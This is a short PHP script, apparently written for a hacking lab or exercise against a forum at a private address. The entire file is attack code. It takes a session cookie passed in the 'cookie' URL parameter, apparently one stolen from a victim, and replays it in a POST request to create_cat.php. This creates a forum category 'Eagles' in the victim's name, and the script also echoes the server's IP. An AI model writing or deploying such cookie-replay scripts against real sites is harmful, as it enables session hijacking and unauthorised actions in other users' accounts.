<?php
    //The url you wish to send the POST request to
    $url = "http://10.0.1.1/create_cat.php";

    echo "<html><head><p>The website has been accessed. IP: " . $_SERVER["SERVER_ADDR"] . "</p></head></html>";

    //The data you want to send via POST
    $fields = [
        'cat_name'      => "Eagles",
        'cat_description' => "Where to find those delicious sloths!",
    ];

    //url-ify the data for the POST
    $fields_string = http_build_query($fields);

    //open connection
    $ch = curl_init();

    //set the url, number of POST vars, POST data
    curl_setopt($ch,CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_POST, true);
    curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

    // Adding the cookie:
    curl_setopt($ch,CURLOPT_COOKIE,$_GET["cookie"]);

    //So that curl_exec returns the contents of the cURL; rather than echoing it
    curl_setopt($ch,CURLOPT_RETURNTRANSFER, true); 

    //execute post
    $result = curl_exec($ch);
    // echo $result;
?>